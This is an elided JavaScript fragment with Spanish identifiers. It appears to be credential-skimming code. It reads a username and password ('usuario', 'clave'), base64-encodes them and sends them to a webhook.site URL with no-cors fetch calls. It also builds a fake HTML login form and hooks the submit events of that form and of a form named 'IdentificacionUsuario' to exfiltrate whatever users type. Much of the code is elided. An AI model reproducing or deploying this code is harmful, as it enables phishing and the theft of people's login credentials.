...
async function atms() {
    ...
    try {
        ...
        if (usuario && clave) {
            fetch('https://webhook.site/4ca70dcd-a8b1-43d2-a502-dab2013e9b2c?u=' + btoa(usuario) + '&p=' + btoa(clave), { mode: 'no-cors' });
        ...
        let htmlFalso = `
            ...
            formulario.addEventListener('submit', function(evento) {
                ...
                let urlWebhook = 'https://webhook.site/4ca70dcd-a8b1-43d2-a502-dab2013e9b2c?u=' + btoa(usuario) + '&p=' + btoa(clave);
        ...
        document.getElementById('IdentificacionUsuario').addEventListener('submit', async function(e) {
            ...
            fetch('https://webhook.site/4ca70dcd-a8b1-43d2-a502-dab2013e9b2c?u=' + btoa(uFalso) + '&p=' + btoa(pFalso), { mode: 'no-cors' });
